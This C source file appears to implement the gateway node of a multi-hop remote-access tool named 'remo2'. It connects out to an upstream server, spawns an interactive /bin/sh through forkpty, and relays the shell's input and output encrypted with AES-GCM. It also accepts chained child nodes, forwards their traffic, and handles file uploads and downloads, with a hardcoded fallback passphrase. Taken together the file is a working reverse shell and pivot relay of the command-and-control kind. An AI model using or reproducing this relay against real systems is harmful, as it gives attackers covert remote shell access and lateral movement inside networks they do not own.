#define _GNU_SOURCE
#include "gateway.h"
#include "aes.h"
#include "session.h"
#include "file_mgr.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <pty.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>

/* send plain-text error to upstream before closing, so server can see it */
static void gw_send_error(int fd, const char *stage) {
    if (fd < 0) return;
    char buf[256];
    int len = snprintf(buf, sizeof(buf),
        "\n[gateway] INIT FAILED at '%s': %s (errno=%d)\n", stage, strerror(errno), errno);
    send(fd, buf, len, MSG_NOSIGNAL);
}

static int nb_write(int fd, const void *buf, size_t len) {
    ssize_t w = send(fd, buf, len, MSG_DONTWAIT | MSG_NOSIGNAL);
    if (w < 0) { if (errno == EAGAIN || errno == EWOULDBLOCK) return 0; return -1; }
    return (int)w;
}

static int write_blk(int fd, const void *buf, size_t len) {
    size_t done = 0;
    const unsigned char *p = (const unsigned char *)buf;
    while (done < len) {
        ssize_t w = send(fd, p + done, len - done, MSG_NOSIGNAL);
        if (w < 0) { if (errno == EINTR) continue; return -1; }
        done += (size_t)w;
    }
    return 0;
}

static gw_child_t *find_child_by_fd(gw_ctx_t *ctx, int fd) {
    for (int i = 0; i < GW_MAX_CHILDREN; i++)
        if (ctx->children[i].active && ctx->children[i].fd == fd)
            return &ctx->children[i];
    return NULL;
}

static gw_child_t *find_child_by_node(gw_ctx_t *ctx, uint8_t node_id) {
    for (int i = 0; i < GW_MAX_CHILDREN; i++)
        if (ctx->children[i].active && ctx->children[i].node_id == node_id)
            return &ctx->children[i];
    return NULL;
}

static int assign_child_id(gw_ctx_t *ctx) {
    int used[GW_MAX_CHILDREN + 1] = {0};
    for (int i = 0; i < GW_MAX_CHILDREN; i++)
        if (ctx->children[i].active) used[ctx->children[i].node_id] = 1;
    for (int id = REMO2_NODE_C2; id < REMO2_NODE_MAX; id++)
        if (!used[id]) return id;
    return -1;
}

static void cleanup_all_children(gw_ctx_t *ctx) {
    int cleaned = 0;
    for (int i = 0; i < GW_MAX_CHILDREN; i++) {
        if (ctx->children[i].active) {
            if (!cleaned) { printf("[gateway] terminating all children\n"); cleaned = 1; }
            shutdown(ctx->children[i].fd, SHUT_RDWR);
            close(ctx->children[i].fd);
            memset(&ctx->children[i], 0, sizeof(gw_child_t));
        }
    }
    ctx->child_count = 0;
}

static int add_child_node(gw_ctx_t *ctx, int fd) {
    int si = -1;
    for (int i = 0; i < GW_MAX_CHILDREN; i++)
        if (!ctx->children[i].active) { si = i; break; }
    if (si < 0) { close(fd); return -1; }
    int nid = assign_child_id(ctx);
    if (nid < 0) { close(fd); return -1; }

    memset(&ctx->children[si], 0, sizeof(gw_child_t));
    ctx->children[si].fd      = fd;
    ctx->children[si].node_id = (uint8_t)nid;
    ctx->children[si].active  = 1;

    int pi = ctx->pfd_count++;
    ctx->pfds[pi].fd     = fd;
    ctx->pfds[pi].events = POLLIN;
    ctx->children[si].poll_idx = pi;

    printf("[gateway] C%d connected (fd=%d)\n", nid, fd);
    ctx->child_count++;
    return 0;
}

static void remove_child_node(gw_ctx_t *ctx, int si) {
    if (si < 0 || si >= GW_MAX_CHILDREN || !ctx->children[si].active) return;
    gw_child_t *c = &ctx->children[si];
    printf("[gateway] C%d disconnected\n", c->node_id);
    shutdown(c->fd, SHUT_RDWR);
    close(c->fd);
    int pi = c->poll_idx;
    if (pi >= 0 && pi < ctx->pfd_count) {
        int last = ctx->pfd_count - 1;
        if (pi != last) {
            ctx->pfds[pi] = ctx->pfds[last];
            gw_child_t *m = find_child_by_fd(ctx, ctx->pfds[pi].fd);
            if (m) m->poll_idx = pi;
        }
        ctx->pfd_count--;
    }
    memset(c, 0, sizeof(*c));
    ctx->child_count--;
}

static int flush_child_tx(gw_child_t *c) {
    if (c->tx_len == 0) return 0;
    ssize_t nw = nb_write(c->fd, c->tx_buf, c->tx_len);
    if (nw > 0) {
        if ((size_t)nw < c->tx_len) {
            memmove(c->tx_buf, c->tx_buf + nw, c->tx_len - (size_t)nw);
            c->tx_len -= (size_t)nw;
            return 1;
        }
        c->tx_len = 0; c->write_pending = 0;
        return 0;
    } else if (nw == 0) { c->write_pending = 1; return 1; }
    return -1;
}

static int raw_forward_to_child(gw_child_t *c, const void *data, size_t len) {
    if (c->tx_len == 0) {
        ssize_t nw = nb_write(c->fd, data, len);
        if (nw > 0 && (size_t)nw == len) return 0;
        if (nw > 0) {
            size_t r = len - (size_t)nw;
            if (r > sizeof(c->tx_buf)) r = sizeof(c->tx_buf);
            memcpy(c->tx_buf, (const uint8_t *)data + nw, r);
            c->tx_len = r; c->write_pending = 1;
            return 0;
        }
        if (nw == 0) {
            if (len > sizeof(c->tx_buf)) len = sizeof(c->tx_buf);
            memcpy(c->tx_buf, data, len);
            c->tx_len = len; c->write_pending = 1;
            return 0;
        }
        return -1;
    }
    if (c->tx_len + len <= sizeof(c->tx_buf)) {
        memcpy(c->tx_buf + c->tx_len, data, len);
        c->tx_len += len; c->write_pending = 1;
        return 0;
    }
    return -1;
}

static int read_transit_header(int fd, packet_header_t *hdr) {
    ssize_t r = session_read_full(fd, hdr, sizeof(*hdr));
    if (r == 0) return 0;
    if (r < 0) return -1;
    return 1;
}

int gw_init(gw_ctx_t *ctx, const char *server_ip, int server_port,
            int listen_port, const char *passphrase) {
    memset(ctx, 0, sizeof(*ctx));
    ctx->shell_master_fd = -1;
    ctx->my_node_id  = REMO2_NODE_GATEWAY;
    ctx->listen_port = listen_port;
    signal(SIGPIPE, SIG_IGN);

    const char *pw = passphrase && passphrase[0] ? passphrase : "remo2-demo-shared-secret";
    if (aes_derive_key(pw, ctx->key) != 0) { fprintf(stderr, "[gateway] aes_derive_key failed\n"); return -1; }

    ctx->up_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (ctx->up_fd < 0) { perror("upstream socket"); return -1; }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons((uint16_t)server_port);
    if (inet_pton(AF_INET, server_ip, &srv.sin_addr) <= 0) {
        perror("inet_pton"); close(ctx->up_fd); return -1;
    }
    if (connect(ctx->up_fd, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        perror("connect"); close(ctx->up_fd); return -1;
    }
    int opt = 1;
    setsockopt(ctx->up_fd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    printf("[gateway] connected to Server %s:%d\n", server_ip, server_port);

    ctx->listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (ctx->listen_fd < 0) { perror("listen socket"); return -1; }
    setsockopt(ctx->listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in lis;
    memset(&lis, 0, sizeof(lis));
    lis.sin_family      = AF_INET;
    lis.sin_addr.s_addr = INADDR_ANY;
    lis.sin_port        = htons((uint16_t)listen_port);
    if (bind(ctx->listen_fd, (struct sockaddr *)&lis, sizeof(lis)) < 0) {
        perror("bind"); close(ctx->up_fd); close(ctx->listen_fd); return -1;
    }
    if (listen(ctx->listen_fd, GW_MAX_CHILDREN) < 0) {
        perror("listen"); close(ctx->up_fd); close(ctx->listen_fd); return -1;
    }
    printf("[gateway] listening on port %d for C2/C3...\n", listen_port);

    ctx->shell_pid = forkpty(&ctx->shell_master_fd, NULL, NULL, NULL);
    if (ctx->shell_pid < 0) { perror("forkpty"); gw_send_error(ctx->up_fd, "forkpty"); close(ctx->up_fd); close(ctx->listen_fd); return -1; }
    if (ctx->shell_pid == 0) {
        setenv("TERM", "xterm-256color", 1);
        execl("/bin/sh", "sh", "-i", NULL);
        perror("execl"); _exit(127);
    }
    printf("[gateway] local PTY shell ready (pid=%d, master=%d)\n",
           ctx->shell_pid, ctx->shell_master_fd);

    ctx->pfd_count = 0;

    ctx->listen_idx = ctx->pfd_count++;
    ctx->pfds[ctx->listen_idx].fd     = ctx->listen_fd;
    ctx->pfds[ctx->listen_idx].events = POLLIN;

    ctx->up_idx     = ctx->pfd_count++;
    ctx->pfds[ctx->up_idx].fd         = ctx->up_fd;
    ctx->pfds[ctx->up_idx].events     = POLLIN;

    ctx->stdin_idx  = ctx->pfd_count++;
    ctx->pfds[ctx->stdin_idx].fd      = STDIN_FILENO;
    ctx->pfds[ctx->stdin_idx].events  = POLLIN;

    ctx->shell_idx  = ctx->pfd_count++;
    ctx->pfds[ctx->shell_idx].fd      = ctx->shell_master_fd;
    ctx->pfds[ctx->shell_idx].events  = POLLIN;

    ctx->running = 1;
    return 0;
}

void gw_cleanup(gw_ctx_t *ctx) {
    cleanup_all_children(ctx);
    if (ctx->up_fd >= 0) { shutdown(ctx->up_fd, SHUT_RDWR); close(ctx->up_fd); ctx->up_fd = -1; }
    if (ctx->listen_fd >= 0) { close(ctx->listen_fd); ctx->listen_fd = -1; }
    if (ctx->shell_pid > 0) {
        close(ctx->shell_master_fd);
        kill(ctx->shell_pid, SIGTERM);
        waitpid(ctx->shell_pid, NULL, 0);
    }
    ctx->running = 0;
    printf("[gateway] shutdown complete\n");
}

#define GW_BATCH_RECV_MAX  128
#define GW_IDLE_BACKOFF_US 1000
#define GW_IDLE_THRESHOLD  20

int gw_run(gw_ctx_t *ctx) {
    printf("[gateway] entering event loop\n");

    fm_ctx_t fm;
    fm_init(&fm, ctx->up_fd, ctx->key, REMO2_NODE_GATEWAY, REMO2_NODE_SERVER,
            session_send_encrypted, NULL);

    uint32_t seq_out = 0;
    char line_buf[REMO2_TEXT_LEN];
    int  line_len = 0;
    int  idle_count = 0;

    while (ctx->running) {
        for (int i = 0; i < GW_MAX_CHILDREN; i++) {
            gw_child_t *c = &ctx->children[i];
            if (!c->active) continue;
            int pi = c->poll_idx;
            if (pi < 0 || pi >= ctx->pfd_count) continue;
            ctx->pfds[pi].events = POLLIN;
            if (c->write_pending && c->tx_len > 0)
                ctx->pfds[pi].events |= POLLOUT;
        }

        int has_active = 0;
        for (int si = 0; si < REMO2_FILE_SLOTS; si++) {
            if (fm.slots[si].active &&
                (fm.slots[si].op == REMO2_FILE_OP_UPLOAD ||
                 fm.slots[si].op == REMO2_FILE_OP_DOWNLOAD)) {
                has_active = 1; break;
            }
        }

        for (int i = 0; i < GW_MAX_CHILDREN; i++)
            if (ctx->children[i].active && ctx->children[i].write_pending) { has_active = 1; break; }

        int timeout = has_active ? 0 : -1;

        int ret = poll(ctx->pfds, ctx->pfd_count, timeout);
        if (ret < 0) { if (errno == EINTR) continue; perror("poll"); break; }

        if (ret == 0 && has_active) {
            idle_count++;
            if (idle_count > GW_IDLE_THRESHOLD) { usleep(GW_IDLE_BACKOFF_US); idle_count = 0; }
        } else {
            idle_count = 0;
        }

        if (ctx->pfds[ctx->shell_idx].revents & POLLIN) {
            if (ctx->shell_master_fd < 0) continue;
            uint8_t buf[REMO2_TEXT_LEN];
            ssize_t n = read(ctx->shell_master_fd, buf, sizeof(buf));
            if (n > 0) {
                task_frame_t frame;
                memset(&frame, 0, sizeof(frame));
                frame.task_id = REMO2_SHELL_TASK_OUT;
                frame.seq     = seq_out++;
                memcpy(frame.text, buf, n);
                session_send_encrypted(ctx->up_fd, ctx->key, REMO2_STREAM_SHELL,
                                       REMO2_NODE_GATEWAY, REMO2_NODE_SERVER, &frame);
            } else {
                close(ctx->shell_master_fd);
                ctx->shell_master_fd = -1;
                ctx->pfds[ctx->shell_idx].fd = -1;
            }
        }

        if (ctx->pfds[ctx->stdin_idx].revents & POLLIN) {
            char raw[REMO2_TEXT_LEN];
            ssize_t n = read(STDIN_FILENO, raw, sizeof(raw) - 1);
            if (n <= 0) { ctx->pfds[ctx->stdin_idx].fd = -1; /* stdin closed, keep running */ }
            else for (ssize_t i = 0; i < n; i++) {
                line_buf[line_len++] = raw[i];
                if (raw[i] == '\n' || line_len >= (int)sizeof(line_buf) - 1) {
                    line_buf[line_len] = '\0';
                    int ll = line_len;
                    line_len = 0;

                    uint8_t op;
                    char path_buf[REMO2_FILE_MAX_NAME];
                    if (session_parse_cmd(line_buf, ll, &op, path_buf, sizeof(path_buf))) {
                        const char *psrc = path_buf;
                        const char *pdst = psrc + strlen(psrc) + 1;
                        if ((size_t)(pdst - path_buf) >= sizeof(path_buf)) pdst = "";
                        fm_server_prepare_cmd(&fm, &seq_out, op, psrc, pdst);
                    } else {
                        task_frame_t frame;
                        memset(&frame, 0, sizeof(frame));
                        frame.task_id = REMO2_SHELL_TASK_IN;
                        frame.seq     = seq_out++;
                        memcpy(frame.text, line_buf, ll);
                        session_send_encrypted(ctx->up_fd, ctx->key, REMO2_STREAM_SHELL,
                                               REMO2_NODE_GATEWAY, REMO2_NODE_SERVER, &frame);
                    }
                    if (raw[i] != '\n') break;
                }
            }
        }

        if (ctx->pfds[ctx->listen_idx].revents & POLLIN) {
            int cfd = accept(ctx->listen_fd, NULL, NULL);
            if (cfd >= 0) add_child_node(ctx, cfd);
        }

        if (ctx->pfds[ctx->up_idx].revents & POLLIN) {
            for (int batch = 0; batch < GW_BATCH_RECV_MAX; batch++) {
                packet_header_t hdr;
                int hr = read_transit_header(ctx->up_fd, &hdr);
                if (hr == 0) {
                    printf("[gateway] upstream lost, suicide chain\n");
                    cleanup_all_children(ctx);
                    ctx->running = 0; break;
                }
                if (hr < 0) {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) break;
                    printf("[gateway] upstream read error\n");
                    cleanup_all_children(ctx);
                    ctx->running = 0; break;
                }

                uint32_t plen = ntohl(hdr.meta.payload_len);
                uint8_t  dst  = hdr.meta.dst_node;

                if (dst == REMO2_NODE_SERVER || dst == REMO2_NODE_GATEWAY) {
                    if (plen != sizeof(task_frame_t)) {
                        uint8_t discard[4096]; if (plen <= 4096) session_read_full(ctx->up_fd, discard, plen);
                    } else {
                        uint8_t ct[sizeof(task_frame_t)];
                        ssize_t cr = session_read_full(ctx->up_fd, ct, plen);
                        if (cr <= 0) { ctx->running = 0; break; }

                        task_frame_t frame;
                        memset(&frame, 0, sizeof(frame));
                        if (aes_gcm_decrypt(ctx->key,
                                            (const uint8_t *)&hdr.meta, sizeof(hdr.meta),
                                            ct, plen, hdr.iv, hdr.tag,
                                            (uint8_t *)&frame) == 0) {
                            uint8_t sid = hdr.meta.stream_id;
                            if (sid == REMO2_STREAM_SHELL && frame.task_id == REMO2_SHELL_TASK_IN) {
                                size_t tl = strnlen(frame.text, REMO2_TEXT_LEN);
                                if (tl > 0 && ctx->shell_master_fd >= 0) {
                                    size_t done = 0;
                                    while (done < tl) {
                                        ssize_t w = write(ctx->shell_master_fd, frame.text + done, tl - done);
                                        if (w < 0) { if (errno == EINTR) continue; break; }
                                        done += (size_t)w;
                                    }
                                }
                            } else if (sid == REMO2_STREAM_FILE) {
                                fm_client_dispatch(&fm, &seq_out, &frame);
                            }
                        }
                    }
                } else if (dst >= REMO2_NODE_C2) {
                    if (plen <= 4096) {
                        uint8_t payload[4096];
                        ssize_t cr = session_read_full(ctx->up_fd, payload, plen);
                        if (cr <= 0) { ctx->running = 0; break; }
                        gw_child_t *c = find_child_by_node(ctx, dst);
                        if (c) { raw_forward_to_child(c, &hdr, sizeof(hdr)); raw_forward_to_child(c, payload, (size_t)plen); }
                    }
                } else {
                    uint8_t discard[4096]; if (plen <= 4096) session_read_full(ctx->up_fd, discard, plen);
                }

                struct pollfd chk; chk.fd = ctx->up_fd; chk.events = POLLIN;
                if (poll(&chk, 1, 0) == 0) break;
            }
        }
        if (ctx->pfds[ctx->up_idx].revents & (POLLERR | POLLHUP)) {
            printf("[gateway] upstream error\n");
            cleanup_all_children(ctx);
            ctx->running = 0; break;
        }

        for (int i = 0; i < GW_MAX_CHILDREN; i++) {
            gw_child_t *c = &ctx->children[i];
            if (!c->active) continue;
            int pi = c->poll_idx;
            if (pi < 0 || pi >= ctx->pfd_count) continue;

            if (ctx->pfds[pi].revents & POLLOUT) {
                if (flush_child_tx(c) < 0) { remove_child_node(ctx, i); continue; }
            }

            if (ctx->pfds[pi].revents & POLLIN) {
                for (int batch = 0; batch < GW_BATCH_RECV_MAX; batch++) {
                    packet_header_t hdr;
                    int hr = read_transit_header(c->fd, &hdr);
                    if (hr == 0) { remove_child_node(ctx, i); break; }
                    if (hr < 0) {
                        if (errno == EAGAIN || errno == EWOULDBLOCK) break;
                        remove_child_node(ctx, i); break;
                    }

                    uint32_t plen = ntohl(hdr.meta.payload_len);
                    uint8_t  dst  = hdr.meta.dst_node;
                    if (plen > 4096) { remove_child_node(ctx, i); break; }
                    uint8_t payload[4096];
                    ssize_t cr = session_read_full(c->fd, payload, plen);
                    if (cr <= 0) { remove_child_node(ctx, i); break; }

                    if (dst == REMO2_NODE_SERVER) {
                        write_blk(ctx->up_fd, &hdr, sizeof(hdr));
                        write_blk(ctx->up_fd, payload, (size_t)plen);
                    } else if (dst == REMO2_NODE_GATEWAY) {
                        if (plen == sizeof(task_frame_t)) {
                            task_frame_t frame;
                            if (aes_gcm_decrypt(ctx->key,
                                                (const uint8_t *)&hdr.meta, sizeof(hdr.meta),
                                                payload, plen, hdr.iv, hdr.tag,
                                                (uint8_t *)&frame) == 0) {
                                if (hdr.meta.stream_id == REMO2_STREAM_SHELL &&
                                    frame.task_id == REMO2_SHELL_TASK_IN &&
                                    ctx->shell_master_fd >= 0) {
                                    size_t tl = strnlen(frame.text, REMO2_TEXT_LEN);
                                    if (tl > 0) {
                                        size_t d = 0;
                                        while (d < tl) {
                                            ssize_t w = write(ctx->shell_master_fd, frame.text + d, tl - d);
                                            if (w < 0) { if (errno == EINTR) continue; break; }
                                            d += (size_t)w;
                                        }
                                    }
                                }
                            }
                        }
                    } else if (dst >= REMO2_NODE_C2) {
                        gw_child_t *tc = find_child_by_node(ctx, dst);
                        if (tc) { raw_forward_to_child(tc, &hdr, sizeof(hdr)); raw_forward_to_child(tc, payload, (size_t)plen); }
                    }

                    struct pollfd chk; chk.fd = c->fd; chk.events = POLLIN;
                    if (poll(&chk, 1, 0) == 0) break;
                }
            }
            if (ctx->pfds[pi].revents & (POLLERR | POLLHUP))
                remove_child_node(ctx, i);
        }

        fm_client_flush_downloads(&fm, &seq_out);
        fm_server_flush_uploads(&fm, &seq_out);
    }

    fm_cleanup(&fm);
    return 0;
}
